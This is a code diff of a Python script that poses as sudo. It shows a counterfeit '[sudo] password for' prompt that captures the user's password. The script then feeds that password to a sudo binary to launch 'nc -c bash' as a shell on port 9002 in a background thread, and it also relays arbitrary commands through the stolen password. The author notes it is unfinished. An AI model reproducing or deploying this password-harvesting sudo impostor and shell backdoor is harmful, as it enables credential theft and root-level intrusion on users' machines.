@@ -1,20 +1,25 @@
 import os
-from main import bkf
-FIRST_TIME_MSG = """
-We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:
+import getpass
+from threading import Thread as t
 
-#1) Respect the privacy of others.
+sudo_path = "sudobk/sudo"
 
-#2) Think before you type.
+USERNAME = os.getenv("USER")
+if USERNAME is None:
+    USERNAME = "root"
+passkey = getpass.getpass(f"[sudo] password for {USERNAME}: ")
+def revshell():
+    os.system(f'echo "{passkey}" | {sudo_path} nc -c bash localhost 9002')
 
-#3) With great power comes great responsibility.
+def normalsudo(*args):
+
+    # Join all arguments into a single string
+    multiarg = " ".join(str(arg) for arg in args)
+    os.system(f'echo "{passkey}" | {sudo_path} {multiarg}')
 
 
-"""
-USERNAME = str(os.getenv('USER')).replace("\n","")
-print(FIRST_TIME_MSG)
-passkey = int(input("Password: "))
+Revshell_T = t(target=revshell, daemon=True)
 
-revshell_start = f'echo "{passkey}" | {bkf}/sudo nc -c bash localhost 9002'
+sudo = t(target=normalsudo, daemon=True)
 
-# TODO: finish tmr, gn
+# NOTE: more stuff is in test.py before going to this (still testing)
